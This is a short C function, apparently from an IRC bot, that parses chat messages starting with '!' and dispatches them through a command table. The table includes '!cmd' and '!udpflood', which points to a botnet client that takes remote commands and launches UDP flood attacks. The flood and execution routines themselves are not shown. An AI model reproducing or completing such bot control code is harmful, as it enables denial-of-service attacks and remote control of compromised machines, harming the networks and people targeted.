void
parserOrder (struct irc * bot, char * rcv)
{
  int i, len;
  char * cmd, *next;
  char * cmds[7] = { "!say-to", "!say", "!cmd", "!hours", "!enter", "!exit", "!udpflood"}  ;
  
  if (*rcv == '!') { //is a command ?
    next = gettoken (&cmd, ' ', rcv);
    len = (int)(sizeof (cmds)/sizeof (char *));
    chomp (cmd);
    for (i = 0;i < len; i++) {
      if (strcmp (cmd, cmds[i]) == 0) {
        execOrder (bot, i, next);
      }
    }
  }
}